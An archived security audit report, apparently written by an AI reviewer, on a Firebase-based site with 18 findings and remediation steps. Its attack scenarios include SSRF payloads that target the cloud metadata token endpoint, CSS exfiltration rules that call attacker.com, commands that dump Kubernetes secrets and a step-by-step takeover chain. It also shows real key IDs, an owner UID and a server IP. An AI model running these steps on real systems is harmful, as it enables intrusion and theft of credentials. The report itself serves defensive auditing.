# Security Audit Report — hybridcloudworks-61e8d

!!! warning "Archived record"
    This page describes the Firebase-era platform or a migration step that has
    completed. It is kept as history and is not a current runbook. The current
    platform is described from the [home page](../index.md).


> **Superseded note (2026-06-11):** the platform/ansible VPS stack referenced below (kubeadm,
> RabbitMQ, ArgoCD, etc.) was removed in v1.5.0; labs now run on the Hostinger VPS labs platform
> (see `labs-platform-guide.md`). Stack-specific findings are historical.

**Date:** 2026-06-07
**Auditor:** Adversarial Security Review (Claude Code — Principal Cloud Security Architect mode)
**Scope:** Firebase project `hybridcloudworks-61e8d`, full codebase at `Personal-Site_HCW/`
**Methodology:** Static analysis, rule simulation, git history forensics, attack-path enumeration

---

## Executive Summary

This project has **three active, unrotated credentials that provide full administrative control**
over the Firebase project, the Notion workspace, and a Kubernetes cluster. These are not theoretical
risks — the private keys are on disk right now, and two of them have been committed to git history.
The blast radius of a credential leak is total: an attacker with the Firebase Admin SDK service
account key can read and write every Firestore document, mint arbitrary Firebase auth tokens, deploy
Cloud Functions, and grant themselves permanent super_admin status. Rotation is required before any
other remediation work.

The remaining findings range from a Firestore rule that grants full database access to any holder of
a custom auth token (trivially obtainable from the service account key itself), to a storage
misconfiguration that lets any authenticated user pollute production image paths.

---

## STOP — Immediate Rotation Required

Before reading further: **these credentials must be rotated now.**

| Credential                                                            | Location                                                    | Status                                                                                                                      |
| --------------------------------------------------------------------- | ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Firebase Admin SDK service account private key                        | `infrastructure/secrets/credentials/serviceAccountKey.json` | Live. Key `5dc759fff0b3d0d544220f5adfdc8d6e4cc8b4c9` is in git history (commit `7e974c0a`).                                 |
| Notion API token `[REDACTED-ROTATE-CREDENTIAL]`                         | `infrastructure/secrets/env/.env` and `.env.local`          | Live at audit time. Commit `7e974c0a` includes the `infrastructure/secrets/` tree.                                          |
| Kubernetes admin client certificate + private key                     | `infrastructure/secrets/kubernetes/vps_kube_config.yaml`    | Live. Same commit. The decoded `client-key-data` is a full RSA private key for `kubernetes-admin` on `148.230.91.226:6443`. |

The fact that `infrastructure/secrets/` is now gitignored (commit `c96ca1ce`) does **not** protect
anything. The secrets were written into git history at `7e974c0a` and remain fully recoverable by
anyone who has ever cloned or forked the repository, or who has access to GitHub's blob API
(`/repos/.../git/blobs/{sha}`).

**Rotation checklist:**

1. Revoke and regenerate the Firebase Admin SDK service account key in GCP IAM — delete key ID
   `5dc759fff0b3d0d544220f5adfdc8d6e4cc8b4c9`.
2. Revoke the Notion integration token at notion.so/my-integrations and issue a new one.
3. Regenerate the Kubernetes admin client certificate on the VPS (`kubeadm certs renew admin.conf`)
   and replace `.kube/config` everywhere.
4. Rotate `VITE_PUBLER_API_KEY` at Publer's developer settings.
5. Rotate `VITE_FIREBASE_TOKEN` (Firebase CLI token) in GitHub Actions secrets.
6. Perform a git history rewrite (`git filter-repo`) and force-push to remove secrets from history,
   then notify all collaborators to re-clone.

---

## Findings

---

### FINDING-01 — CRITICAL: Firebase Admin SDK Private Key Committed to Git History

**File:** `infrastructure/secrets/credentials/serviceAccountKey.json`
**Git commits:** `7e974c0a` (added full file), `c96ca1ce` (modified — same private key still
present)
**Service account:** `firebase-adminsdk-fbsvc@hybridcloudworks-61e8d.iam.gserviceaccount.com`
**Key ID:** `5dc759fff0b3d0d544220f5adfdc8d6e4cc8b4c9`

**Attack scenario:**
Any person who has ever cloned this repository can extract the private key from git history. With
that key:

1. Authenticate as `firebase-adminsdk-fbsvc` using the Admin SDK or
   `gcloud auth activate-service-account`.
2. Call `admin.auth().createCustomToken(uid)` for any UID, including the owner UID
   (`b9yX4cPkQCVxm5X4yAbvoeVVBS13`).
3. Exchange the custom token for a Firebase ID token — `sign_in_provider == 'custom'` satisfies the
   `isServiceAccount()` Firestore rule.
4. The Firestore catch-all rule now grants **read and write access to the entire database** (see
   FINDING-03).
5. Separately, call `admin.auth().setCustomUserClaims(uid, { adminRole: 'super_admin' })` to
   permanently elevate any UID.
6. Deploy new Cloud Functions, overwrite Firestore security rules, read all user data, delete
   content, inject backdoors.

This is total project compromise. The service account has firebase-admin-level IAM permissions by
default.

The script `scripts/fetch-credentials-and-generate.js` (line 115) explicitly validates the file
exists in the repository tree and exits with an error message saying "Please ensure the file exists
in the repository." This design instruction caused the key to be committed in the first place and is
the root cause.

**Fix:**

- Immediately revoke the key in GCP IAM console.
- Remove from git history:
  `git filter-repo --path infrastructure/secrets/credentials/serviceAccountKey.json --invert-paths`.
- Never store service account keys on disk in the repo. Use Application Default Credentials
  (`GOOGLE_APPLICATION_CREDENTIALS` env var pointing outside the repo) or Workload Identity
  Federation.
- Rewrite `scripts/fetch-credentials-and-generate.js` to use ADC, removing the filesystem key
  validation.

---

### FINDING-02 — CRITICAL: Kubernetes Admin Client Certificate + Private Key in Git History

**File:** `infrastructure/secrets/kubernetes/vps_kube_config.yaml`
**Git commit:** `7e974c0a`
**Cluster:** `kubernetes-admin@kubernetes` at `https://148.230.91.226:6443`

**Attack scenario:**
The `client-key-data` field is a base64-encoded RSA-2048 private key for the `kubernetes-admin`
user, which holds the `cluster-admin` ClusterRoleBinding — the highest-privilege Kubernetes account.
An attacker with this key can:

1. `kubectl --kubeconfig=stolen.yaml get secrets --all-namespaces` to dump every Kubernetes Secret
   in the cluster.
2. Deploy privileged pods (`hostNetwork: true`, `privileged: true`) to escape to the VPS host.
3. Pivot to any service on `148.230.91.226`, including any Firebase credentials stored in cluster
   secrets.
4. Establish persistent access by creating additional ClusterRoleBindings.

Client certificates do not expire unless the cluster CA is rotated. This credential will remain
valid indefinitely.

**Fix:**

- Run `kubeadm certs renew admin.conf` on the VPS immediately and redistribute new kubeconfig
  out-of-band.
- Remove from git history.
- Store kubeconfig in a secrets manager outside the repository. Never in any directory that git
  touches.

---

### FINDING-03 — CRITICAL: Firestore `isServiceAccount()` Catch-All Grants Full Database Access

**File:** `platform/firebase/firestore.rules`, lines 10–25

```js
function isServiceAccount() {
  return request.auth.token.firebase.sign_in_provider == 'custom' ||
         request.auth.token.firebase.identities.size() == 0;
}

match /{document=**} {
  allow read, write: if isServiceAccount();
}
```

**Attack scenario:**
The `sign_in_provider == 'custom'` condition is true for any token minted via
`admin.auth().createCustomToken()`. Anyone with the Firebase Admin SDK key (FINDING-01) — or anyone
who finds another way to obtain a custom token — gains unrestricted read/write access to every
Firestore collection.

Firebase evaluates security rules as a union: a request is allowed if **any** matching rule allows
it. The per-collection rules below this catch-all do not override it. The entire database —
`content`, `blogs`, `users`, `admins`, `recordings`, `ai_providers`, `mcp_servers`,
`admin_audit_logs`, `social_posts`, `social_libraries`, `generated_content_images` — is fully
accessible.

The second condition (`identities.size() == 0`) is also a latent risk: anonymous-to-custom upgrade
flows or certain OAuth edge cases can produce tokens where `identities` is empty, matching this rule
without a custom sign-in.

**Fix:**

- Remove the catch-all `match /{document=**}` rule entirely.
- If BuildShip or Rowy need Firestore access, they should use the Firebase Admin SDK server-side
  (which bypasses rules by design), not client-side custom tokens.
- If a service account UID is genuinely needed in client rules, restrict by the specific service
  account UID: `request.auth.uid == 'exact-service-uid'`.

---

### FINDING-04 — CRITICAL: Notion API Token in Git History + Active Secrets Database Exposed

**File:** `infrastructure/secrets/env/.env` (also `.env.local`)
**Token:** `[REDACTED-ROTATE-CREDENTIAL]`
**Secrets database ID:** `[REDACTED]`
**Git commit:** `7e974c0a` committed this entire directory

**Attack scenario:**
The script `scripts/fetch-credentials-and-generate.js` queries a Notion database using this token
and retrieves other secrets from it — at minimum `OPENAI_API_KEY`. An attacker with this token can:

1. `GET https://api.notion.com/v1/databases/2cb0982b27b680c392e5d8fa4c797cda/query` — dump all rows
   in the secrets database, extracting every API key stored there.
2. Browse all other Notion pages the integration has access to, which may include internal
   operational documentation or additional credentials.
3. Use any exfiltrated OpenAI key to make API calls billed to the owner's account.

This is a secrets store accessed through a leaked token — second-order credential exposure from a
single git commit.

**Fix:**

- Revoke the token at notion.so/my-integrations.
- Audit the Notion secrets database and rotate every key it contains.
- Move secrets management to Firebase Secret Manager (`defineSecret()` in function config), which is
  already partially used in this codebase.
- Remove `NOTION_API_TOKEN` and `NOTION_SECRETS_DB_ID` from all files.

---

### FINDING-05 — HIGH: Legacy Admin Claims Bridge Accepts `admin: true` / `role: 'admin'` as Super Admin

**File:** `functions/lib/admin-auth.js`, lines 89–94

```js
const legacyAdmin =
  decoded.admin === true ||
  decoded.role === 'admin' ||
  (Array.isArray(decoded.roles) && decoded.roles.includes('admin'));
const adminRole = String(decoded.adminRole || (legacyAdmin ? 'super_admin' : ''));
```

**Attack scenario:**
Any Firebase ID token that carries the custom claim `admin: true`, `role: "admin"`, or
`roles: ["admin"]` is automatically elevated to `super_admin` by this bridge — bypassing the
`adminRole` claims system entirely.

Attack vectors:

1. **Via service account** (requires FINDING-01): call
   `admin.auth().setCustomUserClaims(uid, { admin: true })`. The bridge maps this to super_admin.
2. **Old token replay**: Firebase ID tokens are valid for 1 hour. Any token minted with legacy admin
   claims before the system changed is still usable within its validity window.
3. **Third-party tool claims**: If Rowy, BuildShip, or any other tool set `admin: true` as a custom
   claim on any user during the old system, those users retain super_admin access through the
   bridge.

The bridge has no deadline or removal plan. It is an indefinitely-open privilege escalation path
sitting in the authoritative auth function.

**Fix:**

- Remove the legacy bridge immediately. The migration comment has been in place long enough.
- Audit all Firebase Auth users: `admin.auth().listUsers()` — find and revoke any `admin`, `role`,
  or `roles` claims.
- After removal, auth gates depend solely on `adminRole`, which is the correct design.

---

### FINDING-06 — HIGH: `bootstrapCurrentUserAdmin` Grants Any Role When Admin Collection Is Empty

**File:** `functions/cms-functions.js`, lines 4540–4603

```js
const activeAdminsSnap = await admin.firestore()
  .collection('admins').where('active', '==', true).limit(1).get();

if (!activeAdminsSnap.empty) {
  const actor = await requireAdminClaims(req, res, 'super_admin');
  if (!actor) return;
} else {
  const bootstrapCheck = checkBootstrapAllowlist(decoded);
  // ... if UID/email matches allowlist, proceed
}
await setAdminRole(decoded.uid, requestedRole, ...);
```

**Attack scenario:**
If the `admins` Firestore collection is ever emptied (via FINDING-03, an accidental data migration
wipe, or a Firestore rules misconfiguration), the endpoint falls into the bootstrap path. An
attacker who knows the owner UID (`b9yX4cPkQCVxm5X4yAbvoeVVBS13`, from the leaked `.env.local`) can
observe this matches `process.env.VITE_OWNER_ADMIN_UID` in the allowlist check.

More critically: if `CMS_BOOTSTRAP_ALLOW_ANY=true` is ever set (line 4486 checks for this), the
function grants super_admin to **any authenticated Firebase user with zero additional checks**. This
environment variable is a single configuration flag away from a complete privilege escalation to any
account.

**Fix:**

- Hard-code the allowed bootstrap UIDs directly in the function source, not sourced from environment
  variables that could be misconfigured.
- Alternatively, disable this endpoint after initial setup is complete: return `410 Gone` with a
  message directing operators to use the admin SDK directly.
- Log every invocation of this endpoint with full metadata (caller UID, IP, timestamp, outcome)
  regardless of success or failure.
- Never set `CMS_BOOTSTRAP_ALLOW_ANY=true` in any environment.

---

### FINDING-07 — HIGH: `generateCuratedArticleImage` — Unauthenticated Endpoint with Firestore Write and SSRF

**File:** `functions/cms-functions.js`, lines 5572–5648

This onRequest handler has no authentication check. Every other CMS function calls
`requireAdmin(req, res)` as its first operation. This one does not.

**Attack scenario:**
Any unauthenticated HTTP client can POST to
`https://us-central1-hybridcloudworks-61e8d.cloudfunctions.net/generateCuratedArticleImage`.

1. **Cache poisoning**: POST
   `{ "articleId": "real-article-id", "articleUrl": "http://attacker.com/malicious", "articleTitle": "x", "basePrompt": "x" }`.
   The function calls `tryScrapeArticleOgImage()` against the attacker URL, then writes the returned
   image URL to Firestore `curated_article_images/{articleId}`. All readers of that collection now
   receive the attacker's image.
2. **SSRF**: The `articleUrl` field is fetched with no allowlist. POST
   `{ "articleUrl": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ... }`
   — the function attempts to fetch the GCP metadata endpoint, potentially exfiltrating the Cloud
   Function's runtime service account token.
3. **Write amplification / cost attack**: Flood with random `articleId` values to fill Firestore
   with garbage documents and exhaust write quotas.

**Fix:**

- Add `const user = await requireAdmin(req, res, 'viewer'); if (!user) return;` immediately after
  the method check.
- Add a URL allowlist (or at minimum a domain validation regex) before calling
  `tryScrapeArticleOgImage()`.

---

### FINDING-08 — HIGH: Storage Rules Allow Any Authenticated User to Write to Production Paths

**File:** `platform/firebase/storage.rules`

Three production storage paths accept writes from any Firebase-authenticated user, with no admin
check:

| Path                                     | Rule                                     | Line  |
| ---------------------------------------- | ---------------------------------------- | ----- |
| `/certifications/{allPaths=**}`          | `request.auth != null && isValidImage()` | 75    |
| `/database/certifications/{allPaths=**}` | `request.auth != null && isValidImage()` | 80    |
| `/image-gallery/{allPaths=**}`           | `request.auth != null && isValidImage()` | 89    |
| `/draft-images/{pageId}/{allPaths=**}`   | `request.auth != null && isValidImage()` | 16–18 |

Firebase Authentication accounts are free to create with a throwaway Google account.
`isValidImage()` only checks `contentType` and file size — both are fully controlled by the uploader
at the HTTP layer.

**Attack scenario:**

1. Register a free Google account and authenticate with Firebase.
2. Upload a 9.9 MB `image/jpeg` file (technically valid per the rule) containing arbitrary data to
   `/image-gallery/anything.jpg`. The file is now publicly readable at the Firebase Storage URL.
3. For `/draft-images/{pageId}/`, `pageId` is not validated against the authenticated user's UID.
   Any authenticated user can write into any other user's draft image path, overwriting their
   content.
4. The `/certifications/` path stores badge images shown publicly. Any authenticated user can
   replace any certification badge with arbitrary content.

**Fix:**

- All write rules for `/certifications/`, `/database/certifications/`, and `/image-gallery/` must
  require admin access. Replace `request.auth != null` with an admin check or restrict to specific
  trusted service account UIDs (`sign_in_provider == 'custom'` scoped to a known UID).
- The `/draft-images/` rule must enforce ownership: the `pageId` must match the authenticated user's
  UID, or a Firestore document confirming ownership must be validated.

---

### FINDING-09 — HIGH: `VITE_PUBLER_API_KEY` Embedded in Client JavaScript Bundle

**File:** `.env.local` — `VITE_PUBLER_API_KEY=[REDACTED-ROTATE-CREDENTIAL]`
**Also in git history:** `infrastructure/secrets/env/.env` committed at `7e974c0a`

Any `VITE_` prefixed variable is inlined into the production JavaScript bundle by Vite at build
time. This key is visible to any user who opens DevTools and searches the JS bundle.

**Attack scenario:**

1. Open the production site, DevTools → Sources → search for `b89daf5b`.
2. Extract the key and call `GET https://app.publer.com/api/v1/workspaces` with
   `Authorization: Bearer <key>`.
3. Enumerate all connected social media accounts (Facebook, LinkedIn, Twitter/X, Instagram).
4. POST new scheduled content to all accounts, delete existing scheduled posts, or disconnect
   accounts.
5. Publer API keys have account-level scope — this is a full social media account takeover.

**Fix:**

- Remove `VITE_PUBLER_API_KEY` from all `.env` files and never prefix social API keys with `VITE_`.
- All Publer API calls must be proxied through a Cloud Function using a Firebase Secret:
  `defineSecret('PUBLER_API_KEY')`.
- Rotate the key immediately.

---

### FINDING-10 — HIGH: CI/CD Uses Long-Lived Firebase CLI Token Instead of Workload Identity

**File:** `.github/workflows/deploy-functions.yml`, line 51

```yaml
FIREBASE_TOKEN: ${{ secrets.VITE_FIREBASE_TOKEN }}
```

Firebase CLI tokens (`firebase login:ci`) are persistent OAuth refresh tokens. They do not expire
and are not scoped to a single project or operation. A leaked token grants the holder the full
permission set of the user who generated it.

**Attack scenario:**
If the GitHub Actions secret `VITE_FIREBASE_TOKEN` leaks (via a PR from a fork printing workflow
env, a debug log, a compromised GitHub account, or a supply chain attack on any action in the
workflow):

1. `firebase use hybridcloudworks-61e8d && firebase deploy --only functions` from any machine.
2. Deploy a backdoored Cloud Function that exfiltrates all Firestore writes or intercepts auth
   tokens.
3. Overwrite `firestore.rules` to `allow read, write: if true`.
4. Generate new service account keys via the Firebase console API.

**Fix:**

- Replace the CLI token with Workload Identity Federation: configure a GCP Workload Identity Pool
  that trusts `https://token.actions.githubusercontent.com`, bind it to the
  `firebase-adminsdk-fbsvc` service account with `roles/firebase.admin`, and use
  `google-github-actions/auth` in the workflow with `workload_identity_provider` and
  `service_account` parameters.
- Revoke the current CLI token: `firebase logout --token $TOKEN`.

---

### FINDING-11 — HIGH: Script Architecture Mandates Service Account Key in Repository

**File:** `scripts/fetch-credentials-and-generate.js`, lines 110–120

```js
const serviceAccountPath = path.join(
  __dirname,
  '../infrastructure/secrets/credentials/serviceAccountKey.json'
);
if (!fs.existsSync(serviceAccountPath)) {
  console.error('❌ Firebase service account not found at:');
  console.error(`   ${serviceAccountPath}`);
  console.error('\nPlease ensure the file exists in the repository.\n');
  process.exit(1);
}
```

This code validates the presence of the service account key file relative to the repository root and
instructs the developer to put it there. This instruction is the direct cause of FINDING-01. The
design assumes the key belongs in the repository.

**Fix:**

- Remove all filesystem validation of the service account path.
- Initialize Firebase Admin SDK using Application Default Credentials: `admin.initializeApp()` with
  no arguments, using `GOOGLE_APPLICATION_CREDENTIALS` pointing to a location outside the
  repository, or using `gcloud auth application-default login` locally.

---

### FINDING-12 — MEDIUM: `isAdmin()` Firestore Rule References `/admins/approved` — Legacy Allowlist Not Aligned with Modern Claims System

**File:** `platform/firebase/firestore.rules`, lines 17–20

```js
function isAdmin() {
  return isAuthenticated() &&
         request.auth.uid in get(/databases/$(database)/documents/admins/approved).data.uids;
}
```

The Cloud Functions auth system (`admin-auth.js`) uses Firebase Auth custom claims (`adminRole`
claim) as the single source of truth. The Firestore security rules use a different mechanism: a
Firestore document at `/admins/approved` containing an array of UIDs.

These are two separate, unsynchronized admin lists. A user can be:

- In `/admins/approved` but have no `adminRole` claim — passes Firestore rules, fails Cloud
  Functions.
- Have an `adminRole` claim but not be in `/admins/approved` — fails Firestore rules, passes Cloud
  Functions.

Additionally, there is no explicit `match /admins/{document=**}` rule blocking client reads. The
`isServiceAccount()` catch-all (FINDING-03) allows any custom-token holder to read
`/admins/approved` and enumerate all admin UIDs, then `/admins/{uid}` for each to get their email,
role, and permissions.

**Fix:**

- Add `match /admins/{document=**} { allow read, write: if false; }` to block direct client access.
- Unify the admin check: use only Firebase Auth custom claims in both Firestore rules
  (`request.auth.token.adminRole`) and Cloud Functions. Remove the `/admins/approved` document
  lookup from rules entirely.

---

### FINDING-13 — MEDIUM: IaC Security Scan Never Fails the Pipeline

**File:** `.github/workflows/scan-security.yml`, lines 82–91

```yaml
- name: Scan infrastructure configs
  uses: aquasecurity/trivy-action@...
  with:
    scan-type: 'config'
    scan-ref: '.'
    severity: 'CRITICAL,HIGH,MEDIUM'
    exit-code: '0' # always passes
```

The dependency scan (`exit-code: '1'`) and secret scan (`exit-code: '1'`) both block the pipeline on
findings. The IaC scan uses `exit-code: '0'` — it produces SARIF output but never fails a PR or a
push regardless of severity.

**Attack scenario:**
A developer introduces a Terraform change that opens a public Cloud Storage bucket, removes a
firewall rule, or disables TLS. The PR passes CI. Nothing blocks the merge. The misconfiguration
ships to production.

**Fix:**

- Change `exit-code: '0'` to `exit-code: '1'` in the infrastructure scan step.
- Ensure the step is not wrapped in `continue-on-error: true`.

---

### FINDING-14 — MEDIUM: No App Check Enforcement on Any Cloud Function

No call to `enforceAppCheck: true` or equivalent appears anywhere in `functions/index.js` or
`functions/cms-functions.js`.

Without App Check, all HTTP Cloud Functions are reachable by any HTTP client without proving they
are running in the legitimate application. This enables:

1. **Rate-limit abuse on AI generation endpoints**: `generateCuratedArticleImage` and
   `generateArticleDraft` invoke external AI providers. Bots can trigger these at scale to exhaust
   API quotas or drive up costs.
2. **Unauthenticated endpoint enumeration**: Even protected endpoints return structured 401/403
   errors that confirm the endpoint exists and its expected request format.
3. **Bootstrap probing**: Automated attempts against `bootstrapCurrentUserAdmin` can probe the
   allowlist logic without rate limiting.

**Fix:**

- Enable App Check in the Firebase Console with reCAPTCHA Enterprise for the web client.
- Add `enforceAppCheck: true` to the options for all sensitive onRequest functions.
- For genuinely public endpoints (`getPlatformHealth`), configure App Check in monitoring-only mode.

---

### FINDING-15 — MEDIUM: CSP `style-src 'unsafe-inline'` Enables CSS Data Exfiltration

**File:** `firebase.json`, line 50

```
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
```

`'unsafe-inline'` for `style-src` permits any inline `<style>` block and `style=` attribute to
execute. This enables CSS-based data exfiltration attacks that do not require JavaScript and
therefore bypass `script-src` restrictions entirely.

**Attack scenario:**
If an attacker can inject HTML anywhere on the page (via a stored XSS in any Firestore-rendered
content, a reflected parameter, or a third-party script), inline CSS can extract DOM content:

```css
input[value^='a'] {
  background: url(https://attacker.com/?c=a);
}
input[value^='b'] {
  background: url(https://attacker.com/?c=b);
}
```

This extracts hidden field values, CSRF tokens, and partial DOM content character-by-character via
CSS attribute selector probing. It works in all major browsers with no script execution.

**Fix:**

- Replace `'unsafe-inline'` with a per-request nonce:
  `style-src 'self' 'nonce-{random}' https://fonts.googleapis.com`. This requires dynamic CSP header
  generation (Cloudflare Worker or a Firebase Hosting rewrite to a Cloud Function).
- Audit whether all inline styles are necessary. Tailwind utilities do not require `unsafe-inline` —
  only actual `style=""` attributes do.

---

### FINDING-16 — LOW: Audit Log Collection Name Mismatch — Writes Go to an Unprotected Collection

**File:** `functions/lib/admin-auth.js` line 41 vs `platform/firebase/firestore.rules` line 294

- Firestore rules protect: `match /admin_audit_logs/{logId}` (plural — `admin_audit_logs`)
- `admin-auth.js` writes to: `const AUDIT_LOG_PATH = 'admin_audit_log'` (singular —
  `admin_audit_log`)

These are two different collections. The rules protect `admin_audit_logs` (plural). The code writes
audit entries to `admin_audit_log` (singular). The collection actually receiving writes has no
explicit rule — it falls through to the `isServiceAccount()` catch-all and is readable/writable by
any custom-token holder. The audit trail is effectively unprotected.

**Fix:**

- Align the collection name in `admin-auth.js` to `admin_audit_logs` (or update the Firestore rule
  to match `admin_audit_log`).
- Verify by querying both collections in the Firebase Console to determine which contains actual
  data.

---

### FINDING-17 — LOW: Firebase CI Token Named with `VITE_` Prefix

**File:** `.github/workflows/deploy-functions.yml`, line 51: `${{ secrets.VITE_FIREBASE_TOKEN }}`

The `VITE_` prefix is the Vite convention for client-side bundled variables. Naming a server-side
deploy credential with this prefix creates risk that it is accidentally included in a `VITE_` env
block, which would embed the Firebase CLI token into the production JavaScript bundle — a credential
exposure equivalent to FINDING-09.

**Fix:** Rename the GitHub Actions secret to `FIREBASE_DEPLOY_TOKEN` and update the workflow
reference.

---

### FINDING-18 — LOW: Notion Secrets Database ID Exposed Alongside Token

**File:** `infrastructure/secrets/env/.env`
`NOTION_SECRETS_DB_ID=[REDACTED]`

The database ID of the secrets store is co-located with the API token, committed in the same git
blob. While the database ID alone provides no access, it eliminates the enumeration step for an
attacker who has the token and simplifies credential extraction from the Notion API.

**Fix:** After rotating the Notion token (FINDING-04), scope the new integration to only the minimum
necessary pages rather than workspace-level access.

---

## Complete Attack Chain

The most dangerous complete attack path requires no physical access to the developer machine and
relies entirely on git history access:

```
Step 1: git clone (or GitHub API blob access to commit 7e974c0a)
        → Extract serviceAccountKey.json (private key ID: 5dc759fff0...)

Step 2: admin.auth().createCustomToken('b9yX4cPkQCVxm5X4yAbvoeVVBS13')
        → Mint custom token for owner UID (from leaked .env.local)
        → Token has sign_in_provider == 'custom'

Step 3: Exchange custom token for Firebase ID token
        → isServiceAccount() == true in Firestore rules

Step 4: Read entire Firestore database (all collections, all documents)
        → Content pipeline, user data, admin registry, AI configs,
          MCP server configs, audit logs, recordings, social media posts

Step 5: admin.auth().setCustomUserClaims(ownerUID, { adminRole: 'super_admin' })
        → Permanent super_admin claim survives all future credential rotation
          until claims are explicitly cleared

Step 6: firebase deploy --only functions (using leaked FIREBASE_TOKEN)
        → Deploy backdoored Cloud Function
        → Persistent access even after service account key rotation
```

**Time to exploit from repository access: under 10 minutes with standard tooling.**

---

## Remediation Priority

| Priority             | Finding    | Action                                                       |
| -------------------- | ---------- | ------------------------------------------------------------ |
| **P0 — Immediately** | FINDING-01 | Revoke Firebase Admin SDK key `5dc759fff0...` in GCP IAM     |
| **P0 — Immediately** | FINDING-02 | Regenerate Kubernetes admin cert on VPS                      |
| **P0 — Immediately** | FINDING-04 | Revoke Notion token at notion.so/my-integrations             |
| **P0 — Immediately** | FINDING-09 | Rotate Publer API key                                        |
| **P0 — Immediately** | FINDING-10 | Revoke Firebase CLI token; begin Workload Identity migration |
| **P1 — This week**   | FINDING-03 | Remove Firestore `isServiceAccount()` catch-all rule         |
| **P1 — This week**   | FINDING-05 | Remove legacy admin claims bridge from `admin-auth.js`       |
| **P1 — This week**   | FINDING-07 | Add `requireAdmin` to `generateCuratedArticleImage`          |
| **P1 — This week**   | FINDING-08 | Restrict storage write rules to admin-only                   |
| **P1 — This week**   | FINDING-11 | Remove serviceAccountKey.json path reference from script     |
| **P2 — This sprint** | FINDING-06 | Harden `bootstrapCurrentUserAdmin` endpoint                  |
| **P2 — This sprint** | FINDING-12 | Add `/admins/{document=**}` deny rule; unify admin check     |
| **P2 — This sprint** | FINDING-13 | Set IaC scan `exit-code: '1'`                                |
| **P2 — This sprint** | FINDING-14 | Enable App Check enforcement                                 |
| **P3 — Backlog**     | FINDING-15 | Remove `style-src 'unsafe-inline'` from CSP                  |
| **P3 — Backlog**     | FINDING-16 | Fix audit log collection name mismatch                       |
| **P3 — Backlog**     | FINDING-17 | Rename `VITE_FIREBASE_TOKEN` secret                          |
| **P3 — Backlog**     | FINDING-18 | Restrict Notion integration scope                            |

---

_End of report. Total findings: 18 — 4 CRITICAL, 6 HIGH, 4 MEDIUM, 4 LOW._
